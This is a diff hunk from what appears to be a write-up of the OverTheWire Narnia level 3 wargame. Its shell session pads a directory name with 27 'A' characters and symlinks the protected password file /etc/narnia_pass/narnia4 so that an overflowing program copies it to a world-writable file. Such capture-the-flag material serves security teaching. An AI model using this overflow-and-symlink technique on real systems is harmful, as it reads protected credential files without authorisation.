@@ -100,8 +100,6 @@ With this realization, the solution is understandable; we make a symbolically li
 ```
 narnia3@narnia:~$ mkdir -p $(python -c "print '/tmp/'+'A'*27+'/tmp'")
 narnia3@narnia:~$ cd $(python -c "print '/tmp/'+'A'*27+'/tmp'")
-narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA$ cd tmp
 narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ ln -s /etc/narnia_pass/narnia4 BBBB
 narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ touch /tmp/BBBB
 narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ chmod 777 /tmp/BBBB
